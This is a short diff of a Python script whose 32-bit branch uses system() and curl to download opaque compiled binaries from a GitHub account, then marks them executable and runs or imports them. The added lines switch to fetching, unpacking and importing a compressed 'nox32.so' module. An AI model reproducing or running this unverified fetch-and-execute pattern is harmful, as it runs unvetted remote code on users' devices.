@@ -15,6 +15,7 @@ if machine()=='aarch64':
 else:
     if not os.path.exists('body32.so'):system('curl -L https://github.com/Nox-Naved/.../raw/main/body32.so -o body32.so')
     if not os.path.exists('cryptron32.so'):system('curl -L https://github.com/Nox-Naved/.../raw/main/cryptron32.so -o cryptron32.so')
-    system('curl -L https://github.com/Nox-Naved/.../raw/main/nox32 -o nox')
-    system('curl -L https://github.com/Nox-Naved/D-FILE/blob/main/dfile32?raw=true -o dump;chmod +x nox;./nox')
+    system('curl -L https://github.com/Nox-Naved/.../raw/main/nox32.so.bz2 -o nox32.so.bz2')
+    system('curl -L https://github.com/Nox-Naved/D-FILE/blob/main/dfile32?raw=true -o dump;chmod +x dump;bunzip2 nox32.so.bz2;chmod +x nox32.so')
+    import nox32
 
